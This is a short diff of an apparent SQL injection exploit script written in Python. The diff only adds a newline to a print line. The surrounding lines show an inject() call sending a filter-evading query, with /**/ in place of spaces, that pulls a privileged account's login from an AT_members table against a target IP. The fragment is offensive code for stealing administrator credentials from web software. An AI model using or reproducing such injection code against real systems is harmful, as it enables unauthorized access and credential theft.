@@ -132,7 +132,7 @@ def main():
 		username = inject(query, ip)
 		print("")'''
 
-	print("\n[+] Retrieving credentials from a privileged account...")
+	print("\n\n[+] Retrieving credentials from a privileged account...")
 	query = "select/**/login/**/from/**/AT_members/**/where/**/status/**/=/**/3/**/limit/**/1"
 	adminUser = inject(query, ip)
 	print(":", end = '')
